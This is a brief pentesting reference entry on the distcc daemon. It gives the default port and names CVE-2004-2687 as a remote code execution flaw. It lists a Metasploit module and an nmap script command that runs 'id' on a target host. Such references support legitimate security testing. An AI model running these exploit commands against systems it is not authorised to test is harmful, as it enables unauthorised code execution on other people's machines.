Distcc is designed to speed up compilation by taking advantage of unused processing power on other computers. A machine with distcc installed can send code to be compiled across the network to a computer which has the distccd daemon and a compatible compiler installed

**Default port:** 3632

```
PORT     STATE SERVICE
3632/tcp open  distccd
```

# Exploitation

Check if it's vulnerable to **CVE-2004-2687** to execute arbitrary code:

```bash
msf5 > use exploit/unix/misc/distcc_exec
nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"
```

# Shodan

_I don't think shodan detects this service._
